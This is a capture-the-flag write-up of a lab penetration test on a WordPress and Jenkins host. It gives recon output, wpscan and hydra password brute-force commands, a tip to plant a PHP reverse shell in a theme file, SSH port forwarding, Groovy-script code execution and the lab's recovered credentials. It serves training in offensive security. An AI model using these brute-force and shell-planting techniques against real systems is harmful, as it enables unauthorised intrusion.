# THM Internal
![image](https://hackmd.io/_uploads/r1pRAEBo6.png)


## Description
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

### **Scope of Work**

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Ensure that you modify your hosts file to reflect internal.thm
    Any tools or techniques are permitted in this engagement
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope

**(Roleplay off)**

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.

## Recon

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
/phpmyadmin
```

```
Wordpress version
5.4.2

Operating System
Ubuntu

User : admin


```
![image](https://hackmd.io/_uploads/HkcmQrrjp.png)

## Scanning

WPScan

Using wpscan to bruteforce the passwords.

`wpscan --url http://internal.thm/wordpress -U admin -P /path/to/rockyou`

Password :my2boys

## Initital Access

Using the password to gain access. By default wordpress theme can be abuse by putting php reversehell. 

`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

![image](https://hackmd.io/_uploads/B1cn5HHsp.png)


## Gaining User

```
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

```
![image](https://hackmd.io/_uploads/B1VCsHBjp.png)

```
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

## Privilege Escalation
```
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

Given the Jenkins service are up. Can check using netstat.

Need to do port forwarding (idk how to call it).

`ssh -L 9089:172.17.0.2:8080 aubreanna@internal.thm`


![image](https://hackmd.io/_uploads/HJJEABBoT.png)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"```

Bruteforce to gainusername and password..

Use the same method in wordpress to gain RCE. This time use groovy script.
```
```
Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

## Learning
Bruteforce Jenkins
Escalate Docker
Port Forwarding. 







